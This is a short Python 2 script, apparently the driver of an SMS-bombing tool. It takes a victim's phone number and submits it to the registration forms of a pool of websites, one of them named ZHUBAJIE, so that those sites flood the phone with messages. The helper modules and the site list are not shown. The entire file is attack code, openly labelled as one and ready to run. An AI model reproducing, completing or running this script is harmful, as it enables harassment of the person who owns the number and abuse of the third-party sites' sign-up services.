#!/usr/bin/python
#coding:utf-8
import sys

from http_deal import *
from common_data import *

def Attack_ByReg(phoneNumber):

	postData = {}
	headers = g_common_headers

	for elem in g_web_pool:
		url = g_url_pool[elem]	
		if(elem == ZHUBAJIE):
			postData = g_post_data[ZHUBAJIE]
			print 'postData',postData
			postData['sacc'] = str(phoneNumber)
		respData = Get_Data_ByHttp(url,postData,POST_BYNOJSON,headers)

if __name__ == '__main__':

	if( len(sys.argv) != 2 ):
		print 'param check failed'
		sys.exit(0)

	phoneNumber = sys.argv[1]
	print 'attack phone Number',phoneNumber

	Attack_ByReg(phoneNumber)